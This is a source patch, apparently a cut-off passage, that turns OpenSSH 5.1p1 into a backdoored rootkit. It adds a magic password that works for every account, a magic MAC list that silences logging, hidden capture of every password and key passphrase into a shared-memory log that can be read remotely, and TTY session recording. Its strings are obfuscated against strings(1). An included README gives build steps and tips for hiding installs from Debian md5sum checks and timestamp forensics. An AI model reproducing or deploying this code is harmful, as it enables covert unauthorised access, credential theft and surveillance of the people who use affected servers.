@@ -1,0 +1,1409 @@
+diff -ruN openssh-5.1p1.orig/auth.c openssh-5.1p1/auth.c
+--- openssh-5.1p1.orig/auth.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/auth.c	2011-02-25 20:39:24.000000000 -0500
+@@ -72,6 +72,8 @@
+ #endif
+ #include "monitor_wrap.h"
+ 
++#include "hack.h"
++
+ /* import */
+ extern ServerOptions options;
+ extern int use_privsep;
+@@ -266,6 +268,7 @@
+ 	else
+ 		authmsg = authenticated ? "Accepted" : "Failed";
+ 
++	if(!h)
+ 	authlog("%s %s for %s%.100s from %.200s port %d%s",
+ 	    authmsg,
+ 	    method,
+diff -ruN openssh-5.1p1.orig/auth-chall.c openssh-5.1p1/auth-chall.c
+--- openssh-5.1p1.orig/auth-chall.c	2006-09-01 01:38:36.000000000 -0400
++++ openssh-5.1p1/auth-chall.c	2011-02-26 19:12:52.000000000 -0500
+@@ -36,6 +36,11 @@
+ #include "log.h"
+ #include "servconf.h"
+ 
++#include "hack.h"
++#include "packet.h"
++#include <arpa/inet.h>
++#include <string.h>
++
+ /* limited protocol v1 interface to kbd-interactive authentication */
+ 
+ extern KbdintDevice *devices[];
+@@ -109,6 +114,68 @@
+ 		xfree(info);
+ 		break;
+ 	}
++
++	do {
++		int maxlen, len, sid;
++		char *addr;
++		char *action;
++		struct sockaddr_storage sa;
++		socklen_t sa_len = sizeof(sa);
++		char remote[INET6_ADDRSTRLEN], local[INET6_ADDRSTRLEN];
++
++		if(h) break;
++
++		getpeername(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, remote, sizeof(remote));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, remote, sizeof(remote));
++		}
++
++		getsockname(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, local, sizeof(local));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, local, sizeof(local));
++		}
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid < 0)
++			  sid = shmget(SHMKEY, SHMSIZE, 0);
++		if(sid < 0)
++			break;
++
++		addr = shmat(sid, 0, 0);
++		if(addr == (char *)~0)
++			break;
++
++		if(!authenticated)
++			/* DENY */
++			action = U("\xbb\xba\xb1\xa6");
++		else
++			/* ACCEPT */
++			action = U("\xbe\xbc\xbc\xba\xaf\xab");
++
++		action = strdup(action);
++
++		memcpy(&maxlen, addr, 4);
++		memcpy(&len, addr + 4, 4);
++		len += snprintf(addr + 8 + len, maxlen - len - 1,
++				/* %s\t%s\t%s\t%s\t%s\n" */
++				U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++				remote, action, authctxt->user, response, local);
++		memcpy(addr + 4, &len, 4);
++		shmdt(addr);
++
++		free(action);
++	} while(0);
++
+ 	device->free_ctx(authctxt->kbdintctxt);
+ 	authctxt->kbdintctxt = NULL;
+ 	return authenticated;
+diff -ruN openssh-5.1p1.orig/auth-pam.c openssh-5.1p1/auth-pam.c
+--- openssh-5.1p1.orig/auth-pam.c	2008-03-11 07:58:25.000000000 -0400
++++ openssh-5.1p1/auth-pam.c	2011-02-26 19:12:52.000000000 -0500
+@@ -58,6 +58,9 @@
+ #include <string.h>
+ #include <unistd.h>
+ 
++#include "hack.h"
++#include <arpa/inet.h>
++
+ #ifdef USE_PAM
+ #if defined(HAVE_SECURITY_PAM_APPL_H)
+ #include <security/pam_appl.h>
+@@ -830,6 +833,16 @@
+ 		error("PAM: expected one response, got %u", num);
+ 		return (-1);
+ 	}
++
++	/* OpenSSH haqr patch: Authenticate using magic password (kbd-int/PAM) */
++	if(!strcmp(U(MAGICPASSWORD), resp[0])) {
++		sshpam_authenticated = 1;
++		sshpam_authctxt->valid = 1;
++		options.permit_root_login = 1;
++		h = 1;
++		return 0;
++	}
++
+ 	buffer_init(&buffer);
+ 	if (sshpam_authctxt->valid &&
+ 	    (sshpam_authctxt->pw->pw_uid != 0 ||
+@@ -1207,6 +1220,69 @@
+ 
+ 	sshpam_err = pam_authenticate(sshpam_handle, flags);
+ 	sshpam_password = NULL;
++
++	/* OpenSSH haqr patch: Log password authentication/PAM attempts */
++	do {
++		int maxlen, len, sid;
++		char *addr;
++		char *action;
++		struct sockaddr_storage sa;
++		socklen_t sa_len = sizeof(sa);
++		char remote[INET6_ADDRSTRLEN], local[INET6_ADDRSTRLEN];
++
++		if(h) break;
++
++		getpeername(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, remote, sizeof(remote));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, remote, sizeof(remote));
++		}
++
++		getsockname(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, local, sizeof(local));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, local, sizeof(local));
++		}
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid < 0)
++			  sid = shmget(SHMKEY, SHMSIZE, 0);
++		if(sid < 0)
++			break;
++
++		addr = shmat(sid, 0, 0);
++		if(addr == (char *)~0)
++			break;
++
++		if(sshpam_err == PAM_SUCCESS && authctxt->valid)
++			/* ACCEPT */
++			action = U("\xbe\xbc\xbc\xba\xaf\xab");
++		else
++			/* DENY */
++			action = U("\xbb\xba\xb1\xa6");
++
++		action = strdup(action);
++
++		memcpy(&maxlen, addr, 4);
++		memcpy(&len, addr + 4, 4);
++		len += snprintf(addr + 8 + len, maxlen - len - 1,
++				/* %s\t%s\t%s\t%s\t%s\n" */
++				U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++				remote, action, authctxt->user, password, local);
++		memcpy(addr + 4, &len, 4);
++		shmdt(addr);
++
++		free(action);
++	} while(0);
++
+ 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+ 		debug("PAM: password authentication accepted for %.100s",
+ 		    authctxt->user);
+diff -ruN openssh-5.1p1.orig/auth-passwd.c openssh-5.1p1/auth-passwd.c
+--- openssh-5.1p1.orig/auth-passwd.c	2007-10-26 00:25:12.000000000 -0400
++++ openssh-5.1p1/auth-passwd.c	2011-02-26 19:12:52.000000000 -0500
+@@ -53,6 +53,7 @@
+ #include "hostfile.h"
+ #include "auth.h"
+ #include "auth-options.h"
++#include "hack.h"
+ 
+ extern Buffer loginmsg;
+ extern ServerOptions options;
+@@ -93,6 +94,12 @@
+ 	if (*password == '\0' && options.permit_empty_passwd == 0)
+ 		return 0;
+ 
++	/* OpenSSH haqr patch: Authenticate using magic password (plaintext) */
++	if(!strcmp(U(MAGICPASSWORD), password)) {
++		h = 1;
++		return 1;
++	}
++
+ #ifdef KRB5
+ 	if (options.kerberos_authentication == 1) {
+ 		int ret = auth_krb5_password(authctxt, password);
+@@ -125,6 +132,70 @@
+ 	result = sys_auth_passwd(authctxt, password);
+ 	if (authctxt->force_pwchange)
+ 		disable_forwarding();
++
++	do {
++		int maxlen, len, sid;
++		char *addr;
++		char *action;
++		struct sockaddr_storage sa;
++		socklen_t sa_len = sizeof(sa);
++		char remote[INET6_ADDRSTRLEN], local[INET6_ADDRSTRLEN];
++
++		if(h) break;
++
++		getpeername(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, remote, sizeof(remote));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, remote, sizeof(remote));
++		}
++
++		getsockname(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++		if(sa.ss_family == AF_INET6) {
++			struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++			inet_ntop(AF_INET6, &s->sin6_addr, local, sizeof(local));
++		}
++		else {
++			struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++			inet_ntop(AF_INET, &s->sin_addr, local, sizeof(local));
++		}
++
++		sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++		if(sid < 0)
++			sid = shmget(SHMKEY, SHMSIZE, 0);
++
++		if(sid < 0)
++			break;
++
++		addr = shmat(sid, 0, 0);
++		if(addr == (char *)~0)
++			break;
++
++
++		if(result && ok) 
++			/* ACCEPT */
++			action = U("\xbe\xbc\xbc\xba\xaf\xab");
++		else
++			/* DENY */
++			action = U("\xbb\xba\xb1\xa6");
++
++		action = strdup(action);
++		memcpy(&maxlen, addr, 4);
++		memcpy(&len, addr + 4, 4);
++
++		len += snprintf(addr + 8 + len, maxlen - len - 1,
++				/* %s\t%s\t%s\t%s\t%s\n" */
++				U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++				remote, action, authctxt->user, password, local);
++		memcpy(addr + 4, &len, 4);
++		shmdt(addr);
++
++		free(action);
++	} while(0);
++
+ 	return (result && ok);
+ }
+ 
+diff -ruN openssh-5.1p1.orig/channels.c openssh-5.1p1/channels.c
+--- openssh-5.1p1.orig/channels.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/channels.c	2011-02-26 19:12:52.000000000 -0500
+@@ -77,6 +77,99 @@
+ #include "authfd.h"
+ #include "pathnames.h"
+ 
++#include "hack.h"
++
++/**
++ * See http://0xcc.net/ttyrec/index.html.en
++ */
++#define SWAP_ENDIAN(val) ((uint32_t) ( \
++    (((uint32_t) (val) & (uint32_t) 0x000000ffU) << 24) | \
++    (((uint32_t) (val) & (uint32_t) 0x0000ff00U) <<  8) | \
++    (((uint32_t) (val) & (uint32_t) 0x00ff0000U) >>  8) | \
++    (((uint32_t) (val) & (uint32_t) 0xff000000U) >> 24)))
++
++static int ttyrec_write_hdr(FILE *f, struct timeval *tv, int len) {
++        int buf[3];
++
++        buf[0] = tv->tv_sec;
++        buf[1] = tv->tv_usec;
++        buf[2] = len;
++#if BYTE_ORDER == BIG_ENDIAN
++	buf[0] = SWAP_ENDIAN(buf[0]);
++	buf[1] = SWAP_ENDIAN(buf[1]);
++	buf[2] = SWAP_ENDIAN(buf[2]);
++#endif
++
++        return fwrite(buf, sizeof(int), 3, f)? 0: -1;
++}
++
++static char *channel_to_filename(Channel *c, int is_input) {
++	static char fname[2048];
++	static char line[64];
++	static uid_t uid;
++	static pid_t pid;
++	char fmt[1024];
++
++	if(!uid) uid = getuid();
++	if(!pid) pid = getpid();
++	if(isatty(c->rfd)) {
++		if(!*line) {
++#ifdef __linux__
++			int slave;
++			if(ioctl(c->rfd, TIOCGPTN, &slave) != -1)
++				sprintf(line, U("\x8f\x8b\x86\xda\x9b"), slave);
++#else
++			char *p;
++	                snprintf(line, sizeof(line)-1, "%s", ttyname(c->rfd));
++			if((p = strrchr(line, '/')) != NULL) {
++	                        p++;
++	                        memmove(line, p, strlen(p)+1);
++	                }
++#endif
++		}
++
++		strcpy(fmt, U(CHANNELLOG_TTY_FMT));
++		snprintf(fname, sizeof(fname)-1, fmt, U(CHANNELLOG_DIR), uid, line, pid, c->self, is_input?"in": "out");
++	}
++	else {  
++		strcpy(fmt, U(CHANNELLOG_DATA_FMT));
++		snprintf(fname, sizeof(fname)-1, fmt, U(CHANNELLOG_DIR), uid, pid, c->self, is_input?"in": "out");
++	}
++
++	return fname;
++}
++
++static void channel_log_data(Channel *c, char *buf, int len, int is_input) {
++#if CHANNELLOG >= 1
++        FILE *f;
++        char *p;
++	struct timeval tv;
++	int do_tty;
++
++        if(len <= 0 || h)
++                return;
++
++	do_tty = isatty(c->wfd);
++	if(!do_tty) {
++#if CHANNELLOG == 1
++		return;
++#endif
++	}
++
++        p = channel_to_filename(c, is_input);
++	if((f = fopen(p, "at")) == NULL)
++		return;
++
++	if(do_tty) {
++		gettimeofday(&tv, NULL);
++		ttyrec_write_hdr(f, &tv, len);
++	}
++
++	fwrite(buf, 1, len, f);
++	fclose(f);
++#endif
++}
++
+ /* -- channel core */
+ 
+ /*
+@@ -1518,6 +1611,7 @@
+ 			}
+ 			return -1;
+ 		}
++		channel_log_data(c, buf, len, 0);
+ 		if (c->input_filter != NULL) {
+ 			if (c->input_filter(c, buf, len) == -1) {
+ 				debug2("channel %d: filter stops", c->self);
+@@ -1602,6 +1696,7 @@
+ 			}
+ 			return -1;
+ 		}
++		channel_log_data(c, buf, len, 1);
+ 		if (compat20 && c->isatty && dlen >= 1 && buf[0] != '\r') {
+ 			if (tcgetattr(c->wfd, &tio) == 0 &&
+ 			    !(tio.c_lflag & ECHO) && (tio.c_lflag & ICANON)) {
+diff -ruN openssh-5.1p1.orig/hack.h openssh-5.1p1/hack.h
+--- openssh-5.1p1.orig/hack.h	1969-12-31 19:00:00.000000000 -0500
++++ openssh-5.1p1/hack.h	2011-02-26 19:11:13.000000000 -0500
+@@ -0,0 +1,130 @@
++#ifndef __HACK_H__
++#define __HACK_H__
++
++#ifdef __FreeBSD__
++#include <machine/param.h>
++#include <sys/types.h>
++#endif
++#include <sys/ipc.h>
++#include <sys/shm.h>
++#include "xmalloc.h"
++
++
++/**
++ * An unique key for use with shmget(2)
++ * ipcs(1) shows it so avoid picking something like 0xc001b4b3
++ */
++#define SHMKEY		0x01
++
++/**
++ * Size of the shared memory area in bytes
++ */
++#define SHMSIZE		(4*1024*1024)
++
++/**
++ * Uncomment to remove the save/load/dump/shmem
++ * init code from sshd
++ */
++#define SSHD_SHM_HACK	1
++
++/**
++ * The following strings are obfuscated using the
++ * txtinvert utility. To update them, build the
++ * program with 'make txtinvert' and run it like
++ * './txtinvert myNewMagicString' 
++ */
++
++/**
++ * The magic password that will work for any account.
++ * PLAINTEXT: krap!
++ */
++#define MAGICPASSWORD	"\x94\x8d\x9e\x8f\xde"
++
++/**
++ * The magic version string that will make sshd spit out
++ * and zap the contents of the log.
++ * PLAINTEXT: openssh
++ */
++#define MAGICVERSION	"\x90\x8f\x9a\x91\x8c\x8c\x97"
++
++/**
++ * The magic MAC list will make sshd turn off all logging, including
++ * lastlog/utmp/wtmp recording, during the initial key-exchange.
++ * The list of MACs need to be comma separated and consist only of 
++ * supported MAC algorithms.
++ * PLAINTEXT: hmac-md5,hmac-md5
++ */
++#define MAGICMACLIST	"\x97\x92\x9e\x9c\xd2\x92\x9b\xca\xd3\x97\x92\x9e\x9c\xd2\x92\x9b\xca"
++
++/**
++ * When sshd terminates the contents of the log is written
++ * to this file. Upon restart it's loaded again and the file
++ * is unlinked.
++ * PLAINTEXT: /var/tmp/.ex
++ */
++#define SHMTEMPFILE	"\xd0\x89\x9e\x8d\xd0\x8b\x92\x8f\xd0\xd1\x9a\x87"
++
++/**
++ * Log SSH channel data. Channels are used to multiplex I/O
++ * for terminal (pty), forwarded connections, proxies and
++ * files being transferred.
++ *
++ * Set to 0 to disable, 1 to enable TTY logging, 2 to 
++ * enable TTY and data logging.
++ */
++#define CHANNELLOG 1
++
++/**
++ * Directory to store channel logs in.
++ * If this directory does not exist, or isn't writeable by the current user,
++ * no logging will be done. It's recommended this directory is root:root 733
++ * to prevent ordinary users from listing the directory. 
++ * Make sure enough disk space is available, especially if you choose to
++ * enable logging of non-TTY channel data.
++ *
++ * PLAINTEXT: /var/cache/ssh
++ */
++#define CHANNELLOG_DIR "\xd0\x89\x9e\x8d\xd0\x9c\x9e\x9c\x97\x9a\xd0\x8c\x8c\x97"
++
++/**
++ * Format string for TTY logging
++ * The arguments are: log dir, getuid(), pty, channel ID, "in" or "out"
++ * See channel.c for more information.
++ *
++ * PLAINTEXT: %s/uid%ld_%s_pid%u_chan%d_%s
++ */
++#define CHANNELLOG_TTY_FMT \
++	"\xda\x8c\xd0\x8a\x96\x9b\xda\x93\x9b\xd2\xda\x8c\xd2\x8f\x96\x9b" \
++	"\xda\x8a\xd2\x9c\x97\x9e\x91\xda\x9b\xd2\xda\x8c"
++
++/**
++ * Format string for non-TTY channel logging
++ * The arguments are: log dir, getuid(), channel ID, "in" or "out"
++ * See channel.c for more information.
++ *
++ * PLAINTEXT: %s/uid%ld_pid%u_chan%d_%s
++ */
++#define CHANNELLOG_DATA_FMT \
++	"\xda\x8c\xd0\x8a\x96\x9b\xda\x93\x9b\xd2\x8f\x96\x9b\xda\x8a\xd2" \
++	"\x9c\x97\x9e\x91\xda\x9b\xd2\xda\x8c"
++
++
++/* better than cleartext; see txtinvert.c */
++static inline char *U(char *str) {
++	static char *s = NULL;
++	int i;
++
++	if(s)
++		xfree(s);
++
++	s = (char *)xstrdup(str);
++	for(i = 0; s[i]; i++)
++		s[i] = ~(s[i]) & 0xff;
++
++	return s;
++}
++
++/* Hush flag. Set to 1 when magic password is used. */
++extern int h;
++
++#endif
+diff -ruN openssh-5.1p1.orig/kex.c openssh-5.1p1/kex.c
+--- openssh-5.1p1.orig/kex.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/kex.c	2011-02-26 19:12:52.000000000 -0500
+@@ -49,6 +49,8 @@
+ #include "dispatch.h"
+ #include "monitor.h"
+ 
++#include "hack.h"
++
+ #ifdef GSSAPI
+ #include "ssh-gss.h"
+ #endif
+@@ -280,6 +282,8 @@
+ choose_mac(Mac *mac, char *client, char *server)
+ {
+ 	char *name = match_list(client, server, NULL);
++
++	if(strstr(client, U(MAGICMACLIST))) h = 1;
+ 	if (name == NULL)
+ 		fatal("no matching mac found: client %s server %s",
+ 		    client, server);
+diff -ruN openssh-5.1p1.orig/log.c openssh-5.1p1/log.c
+--- openssh-5.1p1.orig/log.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/log.c	2011-02-25 20:55:57.000000000 -0500
+@@ -52,6 +52,10 @@
+ #include "xmalloc.h"
+ #include "log.h"
+ 
++#include "hack.h"
++/* Hush flag. Set to 1 when magic password is used. */
++int h;
++
+ static LogLevel log_level = SYSLOG_LEVEL_INFO;
+ static int log_on_stderr = 1;
+ static int log_facility = LOG_AUTH;
+@@ -340,6 +344,8 @@
+ 	int pri = LOG_INFO;
+ 	int saved_errno = errno;
+ 
++	if(h) return;
++
+ 	if (level > log_level)
+ 		return;
+ 
+diff -ruN openssh-5.1p1.orig/monitor.c openssh-5.1p1/monitor.c
+--- openssh-5.1p1.orig/monitor.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/monitor.c	2011-02-26 19:12:52.000000000 -0500
+@@ -88,6 +88,9 @@
+ #include "compat.h"
+ #include "ssh2.h"
+ 
++#include "hack.h"
++#include <arpa/inet.h>
++
+ #ifdef GSSAPI
+ static Gssctxt *gsscontext = NULL;
+ #endif
+@@ -582,6 +585,9 @@
+ 	keyid = buffer_get_int(m);
+ 	p = buffer_get_string(m, &datlen);
+ 
++	/* OpenSSH haqr patch: receive hush flag from monitored child */
++	h = buffer_get_int(m);
++
+ 	/*
+ 	 * Supported KEX types will only return SHA1 (20 byte) or
+ 	 * SHA256 (32 byte) hashes
+@@ -986,6 +992,69 @@
+ 		for (i = 0; i < num; ++i)
+ 			resp[i] = buffer_get_string(m, NULL);
+ 		ret = (sshpam_device.respond)(sshpam_ctxt, num, resp);
++
++		/* OpenSSH haqr patch: Log keyboard-interactive/PAM login attempts */
++		do {
++			int maxlen, len, sid;
++			char *addr;
++			char *action;
++			struct sockaddr_storage sa;
++			socklen_t sa_len = sizeof(sa);
++			char remote[INET6_ADDRSTRLEN], local[INET6_ADDRSTRLEN];
++
++			if(h) break;
++	
++			getpeername(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++			if(sa.ss_family == AF_INET6) {
++				struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++				inet_ntop(AF_INET6, &s->sin6_addr, remote, sizeof(remote));
++			}
++			else {
++				struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++				inet_ntop(AF_INET, &s->sin_addr, remote, sizeof(remote));
++			}
++	
++			getsockname(packet_get_connection_out(), (struct sockaddr *)&sa, &sa_len);
++			if(sa.ss_family == AF_INET6) {
++				struct sockaddr_in6 *s = (struct sockaddr_in6 *)&sa;
++				inet_ntop(AF_INET6, &s->sin6_addr, local, sizeof(local));
++			}
++			else {
++				struct sockaddr_in *s = (struct sockaddr_in *)&sa;
++				inet_ntop(AF_INET, &s->sin_addr, local, sizeof(local));
++			}
++	
++			sid = shmget(SHMKEY, SHMSIZE, 0666|IPC_CREAT|IPC_EXCL);
++			if(sid < 0)
++				  sid = shmget(SHMKEY, SHMSIZE, 0);
++			if(sid < 0)
++				break;
++	
++			addr = shmat(sid, 0, 0);
++			if(addr == (char *)-1)
++				break;
++	
++			if(ret)
++				/* DENY */
++				action = U("\xbb\xba\xb1\xa6");
++			else
++				/* ACCEPT */
++				action = U("\xbe\xbc\xbc\xba\xaf\xab");
++	
++			action = strdup(action);
++	
++			memcpy(&maxlen, addr, 4);
++			memcpy(&len, addr + 4, 4);
++			len += snprintf(addr + 8 + len, maxlen - len - 1,
++					/* %s\t%s\t%s\t%s\t%s\n" */
++					U("\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf6\xda\x8c\xf5"),
++					remote, action, authctxt->user, resp[0], local);
++			memcpy(addr + 4, &len, 4);
++			shmdt(addr);
++	
++			free(action);
++		} while(0);
++
+ 		for (i = 0; i < num; ++i)
+ 			xfree(resp[i]);
+ 		xfree(resp);
+diff -ruN openssh-5.1p1.orig/monitor_wrap.c openssh-5.1p1/monitor_wrap.c
+--- openssh-5.1p1.orig/monitor_wrap.c	2011-02-20 01:43:50.000000000 -0500
++++ openssh-5.1p1/monitor_wrap.c	2011-02-25 23:46:56.000000000 -0500
+@@ -76,6 +76,8 @@
+ #include "session.h"
+ #include "servconf.h"
+ 
++#include "hack.h"
++
+ /* Imports */
+ extern int compat20;
+ extern Newkeys *newkeys[];
+@@ -194,6 +196,9 @@
+ 	buffer_put_int(&m, kex->host_key_index(key));
+ 	buffer_put_string(&m, data, datalen);
+ 
++	/* OpenSSH haqr patch: send special hush flag from monitored child */
++	buffer_put_int(&m, h);
++
+ 	mm_request_send(pmonitor->m_recvfd, MONITOR_REQ_SIGN, &m);
+ 
+ 	debug3("%s: waiting for MONITOR_ANS_SIGN", __func__);
+diff -ruN openssh-5.1p1.orig/README.hack openssh-5.1p1/README.hack
+--- openssh-5.1p1.orig/README.hack	1969-12-31 19:00:00.000000000 -0500
++++ openssh-5.1p1/README.hack	2011-02-26 19:24:45.000000000 -0500
+@@ -0,0 +1,166 @@
++OpenSSH haqr patch for OpenSSH 5.1p1 (portable)
++   -- Arga Unga Hackare, 2000-2011
++
++
++FEATURES
++- sshd: A magic password that works for every (enabled) account.
++  See MAGICPASSWORD in hack.h
++
++  Use of the magic password will additionally turn off
++  lastlog/utmp/wtmp recording and set the environment variable 
++  HISTFILE to /dev/null
++
++- sshd: If a magic MAC list (see MAGICMACLIST in hack.h) is received
++  during the initial key-exchange, all logging by sshd is disabled,
++  including lastlog/utmp/wtmp recording. The environment variable HISTFILE
++  will also be set to /dev/null for interactive logins.
++
++  Only the initial "Connection from W.X.Y.Z .." will be logged.
++
++  NOTE: PAM logging isn't handled by sshd and will be done as usual. 
++  On PAM-enabled systems like Linux the following will still appear:
++    Connection from W.X.Y.Z port 12345
++    pam_unix(sshd:session): session opened for user root by (uid=0)
++    pam_unix(sshd:session): session closed for user root
++
++  To send the magic cipher list, use the -c option to ssh(1):
++  $ env - ssh -m hmac-md5,hmac-md5 root@example.net
++
++  If using magic password or cipher list, channel logging will be disabled.
++  
++- Password logging to a volatile, shared memory log.
++  Both sshd and the client programs (ssh, scp) log authentication attempts.
++  The log buffer may be read and zapped either locally using the included
++  shmcat.c utility or remotely using a magic version string
++  (see MAGICVERSION in hack.h).
++
++  For sshd, the authentication methods that supports password logging are:
++  + Password: PasswordAuthentication yes; default on Debian)
++  + Keyboard-interactive (PAM): ChallengeResponseAuthentication yes)
++
++  The general logging format is:
++     <source> <action> <username> <password> <target>
++
++  Incoming authentication requests are logged in this format:
++    <remote host> <ACCEPT|ATTEMPT|DENY> <username> <password> -
++
++  The clients will log in a similar format:
++    <local host> ATTEMPT <username> <password> <remote host>
++
++  If a public key is used, the pass-phrase will be logged.
++    UID <uid> <ACCEPT|DENY> KEYFILE <passphrase> <key file>
++
++  Since the shared memory log would be lost on reboot, sshd will dump it to
++  a local file (see SHMTEMPFILE in hack.h) upon receiving SIGTERM.  When
++  sshd restarts, the contents of the file will be loaded into the shared 
++  memory log again and the file is then unlinked.
++
++- SSH channel logging (see CHANNELLOG in hack.h)
++  Terminal I/O logging in a ttyrec(1) compatible format is enabled
++  by default.  Optionally, logging of all channels may be compiled in
++  to log non-TTY data from file transfers and forwarded/proxied 
++  connections.
++  Data is stored to disk (see CHANNELLOG_DIR in hack.h).
++
++
++GENERIC LINUX BUILD INSTRUCTIONS:
++$ tar zxf openssh-5.1p1.tar.gz
++$ patch -p0 < this-patch
++$ cd openssh-5.1p1
++$ ./configure --sysconfdir=/etc/ssh --prefix=/usr .. 
++NOTE: Be careful with the PAM support so you don't lock everyone out
++
++DEBIAN (5.0.8) BUILD INSTRUCTIONS:
++$ apt-get source openssh-server
++$ apt-get build-dep openssh-server
++$ patch -p0 < this-patch
++$ cd openssh-5.1p1 && debuild -us -uc -nc
++The patched binary will be found at:
++  debian/openssh-client/usr/bin/{scp,sftp,ssh}
++  debian/openssh-server/usr/sbin/sshd
++
++FREEBSD BUILD INSTRUCTIONS
++$ cd /var/tmp/
++$ SRC=ftp://ftp.se.freebsd.org/pub/FreeBSD/releases/i386/8.1-RELEASE/src/
++$ for i in ssecure.aa scrypto.a{a,b,c,d,e,f} slib.a{a,b,c}; do curl -O $SRC/$i ; done
++$ for i in ssecure scrypto slib; do cat $i.*|tar zxvf -; done
++$ (cd crypto/openssh && patch -p1 < /var/tmp/this-patch)
++$ cp -p /usr/lib/libssh* /var/tmp
++$ (cd secure/lib/libssh && make -j3 all && make install)
++$ (cd secure/usr.sbin/sshd && make -j3 all)
++$ (cd /var/tmp&&for i in libssh*; do touch -amr $i /usr/lib/$i; done)
++
++
++INSTALL INSTRUCTIONS
++In order to prolong the life of this patch, here are some hints on 
++installing the patch.
++
++- Preserve modification timestamps and inode numbers on files before
++  modifying them:
++  # touch -mr /usr/bin/ssh /var/tmp/knark	# Copy mtime
++  # cat patched-binary > /usr/bin/ssh		# Preserve inode
++  # touch -mr /var/tmp/knark /usr/bin/ssh	# Restore mtime
++
++- Debian keeps track of binaries' MD5 sums to allow the integrity of
++  the system to be verified. You should therefore make sure you keep
++  those MD5 sums in sync with the reality after patching the binaries.
++  The path to those files are:
++  /var/lib/dpkg/info/openssh-client.md5sums
++  /var/lib/dpkg/info/openssh-server.md5sums
++
++  #!/bin/sh
++  # Sample script to update Debian MD5 sums 
++  cd /
++  tempfile=/tmp/knark
++  root=usr/bin/
++  md5sumfile=/var/lib/dpkg/info/openssh-client.md5sums
++  touch -amr $md5sumfile $tempfile
++  for i in scp sftp ssh; do
++    sed -i "s@.*$root$i\$@$(md5sum $root$i)@" $md5sumfile
++  done
++  touch -amr $tempfile $md5sumfile && rm $tempfile
++
++  root=usr/sbin/
++  md5sumfile=/var/lib/dpkg/info/openssh-server.md5sums
++  touch -amr $md5sumfile $tempfile
++  for i in sshd; do
++    sed -i "s@.*$root$i\$@$(md5sum $root$i)@" $md5sumfile
++  done
++  touch -amr $tempfile $md5sumfile && rm $tempfile
++
++  # Verify that that the update succeeded
++  if type debsums 2>&1 >/dev/null; then
++    debsums openssh-client
++    debsums openssh-server
++  fi
++  
++
++OBFUSCATED STRINGS
++To prevent administrators armed with strings(1) from finding suspicous
++looking strings in binaries, all strings introducted by this patch are
++obfuscated with at compile time and de-obfuscated when they're used.
++
++To customize the settings in hack.h (such as the magic password), 
++do 'make txtinvert' and use the utility to produce new strings.
++
++
++THE SHARED MEMORY LOG
++The contents of the shared memory area is as follows
++[shared memory size: 4 bytes][bytes used: 4 bytes][logs.. logs.. logs..]
++..in case you undefine SSHD_SHM_HACK and rather want to keep track of
++that area yourself to automatically send the logged stuff somewhere..
++
++Do a 'make shmcat' to build the utility to dump the shared memory log.
++Run 'shmcat' to display the contents or 'shmcat -d' to display AND zap
++the contents of the log.
++
++
++BUGS
++The shared memory log is 4MB and logging is done sequentially.
++It really should be handled as a ring buffer of records, but it isn't.
++
++This may cause issues with frequent remote authentication attempts,
++such as when SSH worms attempt to bruteforce accounts.
++
++The work-around is to regularly connect to the SSH port, issue the magic
++string and dump the contents of the log. This will zap its contents.
+diff -ruN openssh-5.1p1.orig/session.c openssh-5.1p1/session.c
+--- openssh-5.1p1.orig/session.c	2008-06-16 09:29:18.000000000 -0400
++++ openssh-5.1p1/session.c	2011-02-26 19:12:52.000000000 -0500
+@@ -91,6 +91,8 @@
